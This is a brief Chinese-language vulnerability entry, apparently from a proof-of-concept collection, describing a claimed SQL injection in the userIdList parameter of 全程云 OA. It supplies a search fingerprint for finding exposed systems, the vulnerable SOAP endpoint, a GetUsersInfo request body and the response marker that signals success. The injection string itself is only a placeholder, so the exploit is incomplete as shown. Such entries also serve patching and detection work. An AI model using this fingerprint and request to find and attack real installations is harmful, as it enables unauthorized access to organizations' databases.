# 全程云OAuserIdList存在SQL注入漏洞

全程云 ｜ SQL注入 ｜ —
- **指纹**：`body="images/yipeoplehover.png"`
- **请求**：`POST /oa/pm/svc.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetUsersInfo xmlns="http://tempuri.org/">
<userIdList>string</userIdList>
</GetUsersInfo>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200 GetUsersInfoResponse